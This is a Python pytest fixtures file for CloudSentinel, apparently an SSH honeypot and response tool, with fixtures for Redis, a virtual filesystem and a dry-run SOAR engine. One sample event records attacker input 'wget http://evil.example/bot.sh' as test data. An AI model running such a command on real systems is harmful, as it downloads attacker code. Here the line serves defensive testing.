"""
CloudSentinel Test Fixtures — shared pytest configuration.

Provides:
  - Async test support (pytest-asyncio auto mode)
  - Redis test client fixture
  - Temporary VFS fixture
  - Mock SOAR engine fixture
  - Benchmark group marker
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest


@pytest.fixture(scope="session")
def event_loop():
    """Create a session-scoped event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
async def redis_client():
    """Redis test client — connects to CI Redis or local."""
    import redis.asyncio as aioredis
    url = "redis://localhost:6379/0"
    client = aioredis.from_url(url, encoding="utf-8", decode_responses=True)
    try:
        await client.ping()
    except Exception:
        pytest.skip("Redis not available")
    yield client
    await client.aclose()


@pytest.fixture
def temp_vfs():
    """Create a temporary VirtualFileSystem for testing."""
    from cloudsentinel.vfs import VirtualFileSystem
    vfs = VirtualFileSystem("ubuntu-22.04")
    vfs.mkdir("/")
    vfs.mkdir("/tmp")
    vfs.mkdir("/etc")
    vfs.mkdir("/root")
    return vfs


@pytest.fixture
def mock_soar():
    """Create a SOAREngine in dry-run mode for testing."""
    from cloudsentinel.soar import SOAREngine
    return SOAREngine(
        risk_threshold=30,
        firewall_dry_run=True,
        firewall_enabled=False,
    )


@pytest.fixture
def test_settings():
    """Load test configuration."""
    from cloudsentinel.config import load_settings
    config_path = Path(__file__).parent.parent / "configs" / "usas-production.yaml"
    env_path = Path(__file__).parent.parent / ".env"
    return load_settings(str(config_path), str(env_path))


@pytest.fixture
def sample_session_event():
    """Standard test event fixture."""
    return {
        "eventid": "cloudsentinel.command.input",
        "session": "test-session-001",
        "src_ip": "192.168.1.100",
        "src_port": 54321,
        "timestamp": 1700000000.0,
        "input": "wget http://evil.example/bot.sh",
        "username": "root",
        "country_code": "RU",
        "hassh_md5": "8ba2faa57b1f0332fa12cc96bdf3e1be",
        "version": "SSH-2.0-Dropbear_2022.83",
    }


# ── Benchmark marker ────────────────────────────────────
def pytest_configure(config):
    config.addinivalue_line(
        "markers",
        "benchmark: marks tests as performance benchmarks (run with --benchmark-only)"
    )
